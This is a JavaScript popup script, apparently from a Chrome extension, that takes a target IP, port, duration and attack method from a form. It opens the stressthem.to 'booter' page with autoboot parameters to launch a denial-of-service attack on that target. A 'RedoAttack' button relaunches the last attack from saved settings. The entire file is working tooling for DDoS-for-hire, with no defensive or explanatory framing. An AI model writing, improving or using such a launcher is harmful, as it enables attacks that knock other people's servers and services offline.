chrome.extension.sendMessage({subject: "settings"}, function(response){
    var Ip = document.getElementById("IP");
    var Port = document.getElementById("PORT");
    var Time = document.getElementById("TIME");
    var Method = document.getElementById("METHOD");

    document.getElementById("Submit").onclick = function(){
    

        if (Port.value.length == 0) {
            Port.value = 80;
        }
        if (Time.value.length == 0) {
            Time.value = 240;
        }
        chrome.extension.sendMessage({
            subject: "updateSettings",
            lastIp: Ip.value,
            lastPort: Port.value,
            lastTime: Time.value,
            lastMethod: Method.value
        });
        var URL = "https://stressthem.to/booter?autoboot&ip=" + Ip.value + "&port=" + Port.value + "&time=" + Time.value + "&method=" + Method.value 
        window.open(URL,'_blank');
    
    };
    
    document.getElementById("RedoAttack").onclick = function(){
        window.open(`https://stressthem.to/booter?autoboot&ip=${response.lastIp}&port=${response.lastPort}&time=${response.lastTime}&method=${response.lastMethod}`, '_blank');
    };
    
    document.getElementById("Settings").onclick = function(){
        window.open("settings.html",'_blank');
    };
});
//

